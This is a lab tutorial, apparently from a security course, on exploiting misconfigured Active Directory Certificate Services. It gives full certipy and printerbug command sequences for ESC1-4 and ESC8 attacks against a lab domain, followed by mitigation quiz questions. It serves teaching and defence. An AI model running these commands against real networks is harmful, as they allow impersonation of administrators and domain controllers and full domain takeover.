#ADCS Exploiting

Active Directory Certificate Services is Microsoft's Public Key Infrastructure implementation for Active Directory environments. It allows organizations to issue, manage, and validate various digital certificates. These certificates can be used for user/computer logon, email/file encryption, signing, and Kerberos authentication.

ADCS misconfigurations may lead to possible attack vectors, as we'll see in this section. ADCS related attacks are also named ESC (Enterprise Security Configuration) attacks. There are many ESC attacks. This section will only illustrate some of these.

As a first step to attack AD through the Certificate Services, an attacker should first assess ADCS information, such as the CA (Certificate Authority) name, as well as the templates issued by the CA, in order to look for some vulnerable templates and CA configurations. To do so, the certipy tool may be used:

```
certipy find -u skyler.white@polaris.local -p 'Password123' -vulnerable -dc-ip 192.168.122.10 -stdout
```
This will output various information to stdout. We can see that the CA is called Polaris Root CA, and that it is vulnerable to ESC1-4 and ESC8 attacks.

The ESC8 attack is possible since the CA allows web enrollment. This means that users are allowed to request certificates by authenticating through the network. As we've explored on other attacks, we can relay NTLM authentication from a client to a server and impersonate the client against the legitimate server. In this case, let's relay NTLM messages from the DC itself to the CA (which is being hosted by MEMBER), and this way, retrieve a certificate as the DC itself. The certificate can then be used to obtain a TGT issued for the DC account. This allows the attacker to impersonate the DC through its TGT.
```
#start the relay in terminal 1
certipy relay -target 192.168.122.5 -ca 192.168.122.5 -template DomainController 
#trigger NTLM dc authentication from terminal 2
python3 printerbug.py POLARIS/skyler.white:Password123@192.168.122.10 192.168.122.2 
#now, you should have acquired a certificate through the certipy script. use it to get a TGT as the DC
certipy auth -pfx captain.pfx -dc-ip 192.168.122.10
```

ESC1-4 are related to misconfigured templates, rather than a misconfigured CA. On an ESC1 attack, an attacker takes advantage of the fact that there's a template that allows the enrollee to supply a SubjectAltName (SAN). This SAN identifies to whom this certificate is being issued to. It basically allows the attacker to say "Hey, I'm asking for this certificate, but it's actually for the administrator, not me. So go ahead and issue a certificate on the administrator's behalf, I'll take care of the rest.". Since the template allows the attacker to supply a SAN, the CA issues this certificate in the administrator's name and sends it to the attacker.

```
#retrieve the certificate
certipy req -u skyler.white@polaris.local -p 'Password123' -target 192.168.122.5 -template ESC1 -ca 'Polaris Root CA' -upn administrator@polaris.local
#now use the certificate to authenticate as the administrator
certipy auth -pfx administrator.pfx -dc-ip 192.168.122.10 
```

When it comes to ESC2 and ESC3 templates, these are configured with the 'Any Purpose' EKU and 'Certificate Request Agent' EKUs, respectively. EKU stands for Extended Key Usage, and it determines the uses that a template has. These two EKUs allow a user to use the certificates to request other certificates in name of other users. Having these EKUs set on certificate to which low-privilege users can enroll open ways for ESC2(Any Purpose EKU) and ESC3(Certificate Request Agent EKU) attacks:

```
#request the certificate template with over permissive EKUs. can be either ESC2 or ESC3
certipy req -u skyler.white@polaris.local -p 'Password123' -target 192.168.122.5 -template ESC2 -ca 'Polaris Root CA'
#use the certificate to request another certificate on behalf of another user
certipy req -u skyler.white@polaris.local -p 'Password123' -target 192.168.122.5 -template User -ca 'Polaris Root CA' -on-behalf-of 'polaris\administrator' -pfx skyler.white.pfx
#retrieve a tgt for the administrator user
certipy auth -pfx administrator.pfx -dc-ip 192.168.122.10
```

Finally, the ESC4 attack is possible when the attacker has compromised an account that holds write permissions over a certificate template. By being able to modify a certificate template, the attacker can alter its configuration, and for example, allow the enrollee to supply a SAN (ESC1 attack):

```
#Modify the ESC4 certificate template to allow SANs in the request while saving the old certificate template
certipy template -u skyler.white@polaris.local -p 'Password123' -template ESC4 -dc-ip 192.168.122.10 -target 192.168.122.10 -save-old
#get a certificate for impersonating the administrator through the ESC1 attack, which the ESC4 template is now vulnerable to
certipy req -u skyler.white@polaris.local -p 'Password123' -target 192.168.122.5 -template ESC4 -ca 'Polaris Root CA' -upn administrator@polaris.local
#get a tgt using the template
certipy auth -pfx administrator.pfx -dc-ip 192.168.122.10 
#modify the template once again, setting it back to its old configuration
certipy template -u skyler.white@polaris.local -p 'Password123' -template ESC4 -dc-ip 192.168.122.10 -target 192.168.122.10 -configuration ESC4.json

```

!!! question
    How can an administrator prevent ESC8 attacks?
??? success "Answer"
    The admins can prevent these attacks by disabling CA web enrollment, or by mitigating relay attacks themselves, through enabling SMB signing on CA servers, which would also prevent this attack.
!!! question
    How does ESC1 lead to impersonation of any user, including Domain Admins?
??? success "Answer"
    In an ESC1 attack, the certificate template is misconfigured to allow the enrollee to specify the Subject Alternative Name (SAN). Since the SAN defines the identity the certificate represents, an attacker can simply request a certificate where the SAN is set to a privileged account, like Administrator. The CA issues the certificate without verifying ownership, giving the attacker valid credentials to impersonate that account.
!!! question
    What's the difference between ESC2 and ESC3 attacks?
??? success "Answer"
    The Extended Key Usage values are different. In ESC2, the template has an 'Any Purpose' EKU, which means the certificate can be used for anything, while ESC3 has the 'Certificate Request Agent' EKU which is more granular, but still the EKU that allows to perpetrate these attacks.

